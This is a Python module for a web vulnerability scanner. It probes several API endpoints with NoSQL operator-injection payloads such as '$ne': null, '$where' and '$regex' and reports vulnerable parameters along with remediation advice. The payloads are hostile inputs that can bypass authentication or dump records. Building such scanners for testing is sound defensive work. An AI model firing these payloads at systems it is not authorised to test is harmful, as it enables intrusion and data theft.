"""
NoSQL Injection Scanner Module
"""

from typing import List
from .scanner_base import BaseScanner, ScanResult, Severity
import json


class NoSQLInjectionScanner(BaseScanner):
    """Scanner for NoSQL Injection vulnerabilities"""

    # NoSQL injection payloads
    PAYLOADS = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "1==1"}',
        '{"username": {"$ne": null}}',
        '{"$regex": ".*"}',
    ]

    def scan(self) -> List[ScanResult]:
        """Run NoSQL injection scan"""
        results = []

        # Test NoSQL endpoints
        endpoints = [
            '/api/nosql/',
            '/api/search/',
            '/api/users/',
        ]

        for endpoint in endpoints:
            self.log(f"Testing endpoint: {endpoint}")

            for param in ['username', 'query', 'filter']:
                for payload in self.PAYLOADS:
                    result = self._test_nosqli(endpoint, param, payload)
                    if result:
                        results.append(result)
                        break

        if not results:
            results.append(self.create_result(
                attack_type='nosqli',
                endpoint=self.target_url,
                vulnerable=False,
                severity=Severity.INFO,
                description='No NoSQL injection vulnerabilities detected'
            ))

        return results

    def _test_nosqli(self, endpoint: str, param: str, payload: str) -> ScanResult:
        """Test for NoSQL injection"""
        test_url = f"{endpoint}?{param}={payload}"

        response = self.make_request(test_url)

        if response and (
            'results' in response.text.lower() or
            '_id' in response.text or
            len(response.text) > 100  # Potential data leak
        ):
            try:
                data = json.loads(response.text)
                if isinstance(data, dict) and data.get('results'):
                    return self.create_result(
                        attack_type='nosqli',
                        endpoint=test_url,
                        vulnerable=True,
                        severity=Severity.HIGH,
                        description=f'NoSQL Injection vulnerability detected in {param} parameter',
                        payload=payload,
                        evidence=response.text[:500],
                        recommendation='Validate and sanitize input. Use schema validation. Avoid passing raw user input to queries.',
                        cwe='CWE-943',
                        owasp='A03:2021 - Injection'
                    )
            except:
                pass

        return None
